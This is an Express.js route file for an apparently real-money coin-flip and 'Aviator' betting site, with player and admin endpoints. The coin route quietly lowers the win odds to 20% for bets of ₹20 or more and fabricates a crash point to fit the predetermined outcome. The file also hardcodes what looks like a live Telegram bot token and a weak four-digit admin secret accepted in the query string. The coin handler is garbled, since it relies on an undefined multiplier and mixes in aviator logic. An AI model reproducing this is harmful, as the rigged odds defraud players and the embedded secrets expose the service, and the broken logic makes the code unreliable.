// routes/game.js
const router      = require('express').Router();
const User        = require('../models/User');
const Transaction = require('../models/Transaction');
const GameConfig  = require('../models/GameConfig');
const { auth }    = require('../middleware/auth');
const axios       = require('axios');

const ADMIN_SECRET = process.env.ADMIN_SECRET || '8435';
const BOT_TOKEN    = process.env.BOT_TOKEN    || '7507385917:AAG3MmJO2VlzJAfvyjKeu_hqfQ0F3dCztow';

async function sendTG(chat_id, text) {
  if (!chat_id) return;
  try { await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    { chat_id, text, parse_mode:'Markdown' }, { timeout:8000 }); } catch(e) {}
}

function adminAuth(req, res, next) {
  const s = req.headers['x-admin-secret'] || req.query.secret;
  if (!s || s !== ADMIN_SECRET)
    return res.status(403).json({ status:'error', message:'Unauthorized' });
  next();
}

// Seed default configs (Minimum Bet updated to 1)
async function seedConfigs() {
  for (const game of ['coin','aviator']) {
    const exists = await GameConfig.findOne({ game });
    if (!exists) await GameConfig.create({ game,
      win_chance: 49, min_bet: 1, multiplier: game==='coin'?2:0, extra_win: 3 });
    else if (exists.min_bet !== 1) {
      await GameConfig.updateOne({ game }, { $set: { min_bet: 1 } });
    }
  }
}
seedConfigs().catch(()=>{});

// ── GET /game/config/:game ─────────────────────────────────────────────────
router.get('/config/:game', async (req, res) => {
  try {
    const cfg = await GameConfig.findOne({ game: req.params.game });
    if (!cfg) return res.json({ status:'error', message:'Config not found' });
    res.json({ status:'success', config: {
      game:       cfg.game,
      min_bet:    1, // Strictly 1
      extra_win:  cfg.extra_win
    }});
  } catch(e) { res.status(500).json({ status:'error', message:e.message }); }
});

// ── POST /game/coin/play ───────────────────────────────────────────────────
router.post('/coin/play', auth, async (req, res) => {
  try {
    const { bet, choice } = req.body;
    const betAmt = Math.round(parseFloat(bet)*100)/100;
    
    // Strict Validation
    if (isNaN(betAmt) || betAmt < 1)
      return res.json({ status:'error', message:'Minimum bet ₹1 required' });

    if (!['heads','tails'].includes(choice))
      return res.json({ status:'error', message:'Choice must be heads or tails' });

    const user = await User.findById(req.user._id);
    if (!user) return res.status(404).json({ status:'error', message:'User not found' });
    if (user.balance < betAmt)
      return res.json({ status:'error', message:`Insufficient balance. Available: ₹${user.balance}` });

     // ── Probability Logic ──
    let userWins = false;
    const roll = Math.random() * 100;

    if (betAmt >= 20) {
      // 20+ amount: 80% loss chance
      userWins = roll < 20;
    } else {
      // Under 20: 49% win chance
      userWins = roll < 49;
    }

    const cfg = await GameConfig.findOne({ game:'aviator' });
    const extraWin = cfg?.extra_win || 3;

    let crashPoint;
    if (userWins) {
      crashPoint = Math.round((cashoutMult + Math.random() * 0.5) * 100) / 100;
    } else {
      const maxCrash = Math.max(1.01, cashoutMult - 0.01);
      crashPoint = Math.round((1 + Math.random() * (maxCrash - 1)) * 100) / 100;
    }

    const txId = 'AG' + Date.now() + Math.floor(Math.random()*999);
    const now  = new Date();
    let pnl, newBal;

    if (userWins) {
      const winAmt = Math.round(betAmt * cashoutMult * (1 + extraWin/100) * 100) / 100;
      pnl    = winAmt - betAmt;
      newBal = Math.round((user.balance + pnl) * 100) / 100;
      await User.findByIdAndUpdate(req.user._id, { $set: { balance: newBal } });
      await Transaction.create({
        tx_id: txId, receiver_id: req.user._id,
        amount: winAmt, type:'game_win', status:'success',
        remark:`✈️ Aviator Win — ${cashoutMult}x — ₹${betAmt} bet`, tx_time: now
      });
    } else {
      pnl    = -betAmt;
      newBal = Math.round((user.balance - betAmt) * 100) / 100;
      await User.findByIdAndUpdate(req.user._id, { $set: { balance: newBal } });
      await Transaction.create({
        tx_id: txId, sender_id: req.user._id,
        amount: betAmt, type:'game_loss', status:'success',
        remark:`✈️ Aviator Loss — ${cashoutMult}x — ₹${betAmt} bet`, tx_time: now
      });
    }

    res.json({
      status:      'success',
      won:         userWins,
      crash_point: crashPoint,
      cashout:     cashoutMult,
      bet:         betAmt,
      pnl,
      balance:     newBal,
      tx_id:       txId
    });
  } catch(e) { res.status(500).json({ status:'error', message:e.message }); }
});

// (Remaining admin routes stay the same...)
router.get('/admin/config', adminAuth, async (req, res) => {
  try {
    const configs = await GameConfig.find();
    res.json({ status:'success', configs });
  } catch(e) { res.status(500).json({ status:'error', message:e.message }); }
});

router.put('/admin/config/:game', adminAuth, async (req, res) => {
  try {
    const { win_chance, min_bet, extra_win } = req.body;
    const cfg = await GameConfig.findOneAndUpdate(
      { game: req.params.game },
      { $set: { win_chance, min_bet, extra_win, updated_at: new Date() } },
      { new: true, upsert: true }
    );
    res.json({ status:'success', config: cfg });
  } catch(e) { res.status(500).json({ status:'error', message:e.message }); }
});

router.get('/admin/stats', adminAuth, async (req, res) => {
  try {
    const [wins, losses] = await Promise.all([
      Transaction.aggregate([
        { $match: { type:'game_win' } },
        { $group: { _id:null, total:{ $sum:'$amount' }, count:{ $sum:1 } } }
      ]),
      Transaction.aggregate([
        { $match: { type:'game_loss' } },
        { $group: { _id:null, total:{ $sum:'$amount' }, count:{ $sum:1 } } }
      ])
    ]);
    res.json({
      status: 'success',
      wins:   { total: wins[0]?.total||0,   count: wins[0]?.count||0 },
      losses: { total: losses[0]?.total||0, count: losses[0]?.count||0 },
      profit: (losses[0]?.total||0) - (wins[0]?.total||0)
    });
  } catch(e) { res.status(500).json({ status:'error', message:e.message }); }
});

module.exports = router
